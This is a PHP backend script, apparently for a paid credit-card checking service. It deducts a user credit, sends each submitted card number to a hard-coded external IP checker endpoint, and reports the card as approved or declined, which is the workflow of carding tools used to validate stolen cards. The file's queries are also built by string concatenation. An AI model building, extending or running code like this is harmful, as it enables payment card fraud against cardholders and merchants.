<?php
include('../config.php');
session_start();
header('Content-Type: application/json');

if (!isset($_SESSION['user_id'])) {
    echo json_encode(['status' => 'error', 'message' => 'Not logged in']);
    exit();
}

$user_id = $_SESSION['user_id'];

// Fetch current credits
$sql = "SELECT username, credit, total_cc, usertype FROM users WHERE id = '$user_id' LIMIT 1";
$result = mysqli_query($conn, $sql);
$user = mysqli_fetch_assoc($result);

if (!$user || $user['credit'] <= 0) {
    echo json_encode(['status' => 'error', 'message' => 'No credits left']);
    exit();
}

// Deduct 1 credit
$update = "UPDATE users SET credit = credit - 1 WHERE id = '$user_id'";
mysqli_query($conn, $update);

if (isset($_POST['cc'])) {
    $cc = trim($_POST['cc']);
    $api_url = "http://137.184.155.22/chk.php?cc=" . urlencode($cc);

    $start = microtime(true);
    $response = @file_get_contents($api_url);
    $end = microtime(true);
    $time_taken = round($end - $start, 2) . 's';

    $decoded = json_decode($response, true);

    if (!$decoded || !isset($decoded['status'])) {
        echo json_encode([
            'status' => 'error',
            'message' => 'Invalid response from API',
            'raw' => $response
        ]);
        exit();
    }

    $message_raw = strtolower($decoded['message'] ?? '');
    $final_status = (strpos($message_raw, 'payment failed') !== false) ? '𝗗𝗘𝗖𝗟𝗜𝗡𝗘 ❌' : '𝗔𝗣𝗣𝗥𝗢𝗩𝗘 ✅';

    echo json_encode([
        'status' => $final_status,
        'message' => $decoded['message'] ?? 'No message',
        'card' => $decoded['card'] ?? $cc,
        'time' => $time_taken,
        'raw' => $response
    ]);

} else {
    echo json_encode([
        'status' => 'Invalid Request',
        'message' => 'No card provided.'
    ]);
}
?>
